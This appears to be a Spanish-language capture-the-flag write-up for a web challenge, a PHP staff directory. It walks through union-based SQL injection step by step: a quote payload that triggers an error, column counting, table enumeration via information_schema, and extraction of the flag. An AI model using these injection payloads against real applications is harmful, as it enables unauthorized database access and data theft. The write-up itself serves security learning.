---
title: "Utopia Smart City Directory"
description: 'El reto presenta un directorio de empleados del gobierno de "Utopia Smart City". La aplicación permite filtrar el personal por departamento a través de un parámetro GET en la URL. El objetivo es explorar la base de datos y extraer información oculta.'
pubDate: 'Jan 25 2026'
heroImage: ''
ctf: 'Fluid Attack 2026'
---

**Categoría:** Web / SQL Injection
**Dificultad:** Easy
**Puntos:** 225

## Descripción del Reto

El reto presenta un directorio de empleados del gobierno de "Utopia Smart City". La aplicación permite filtrar el personal por departamento a través de un parámetro GET en la URL. El objetivo es explorar la base de datos y extraer información oculta.

URL Objetivo:
`https://5203c77498bf1408.chal.ctf.ae/directory.php?dept=transport`

## Análisis y Reconocimiento

Al interactuar con el parámetro `dept`, se intentó inyectar una comilla simple (`'`) para verificar la validación de entrada.

**Payload de prueba:**
`directory.php?dept=transport'`

**Resultado:**
La aplicación devolvió un error crítico de base de datos, revelando la tecnología subyacente (MariaDB) y la falta de sanitización:

> Fatal error: Uncaught mysqli_sql_exception: You have an error in your SQL syntax; [...] near '' ORDER BY name' at line 1

Este error confirma una vulnerabilidad de **SQL Injection (SQLi)** y sugiere que la consulta termina con una cláusula `ORDER BY`.

## Explotación

Se procedió a realizar un ataque de tipo **UNION-Based SQL Injection** para extraer datos de otras tablas.

### 1. Determinación del número de columnas

Para utilizar el operador `UNION`, es necesario igualar el número de columnas de la consulta original. Se inyectaron sentencias `UNION SELECT` incrementales.

**Payload:**
`transport' UNION SELECT 1,2-- -`

La aplicación cargó correctamente y mostró los números `1` y `2` en la interfaz, confirmando que la consulta original utiliza **2 columnas**.

### 2. Enumeración de Tablas

Utilizando la segunda columna visible para la exfiltración de datos, se consultó el esquema de información (`information_schema`) para listar las tablas presentes en la base de datos actual.

**Payload:**

```sql
-1' UNION SELECT 1,group_concat(table_name) FROM information_schema.tables WHERE table_schema=database()-- -

```

**Resultado:**
La aplicación reveló dos tablas:
`staff,flag`

La tabla de interés es `flag`.

### 3. Extracción de la Bandera

Una vez identificada la tabla `flag`, se procedió a extraer el contenido. Se asumió que la columna contenedora poseía un nombre estándar (como `flag`), aunque técnicamente se podría haber enumerado desde `information_schema.columns`.

**Payload Final:**

```sql
-1' UNION SELECT 1,flag FROM flag-- -

```

La consulta fue exitosa y la base de datos devolvió el contenido de la tabla secreta.

## Resultado

**Flag capturada:**
`flag{8d9cea51f2597426}`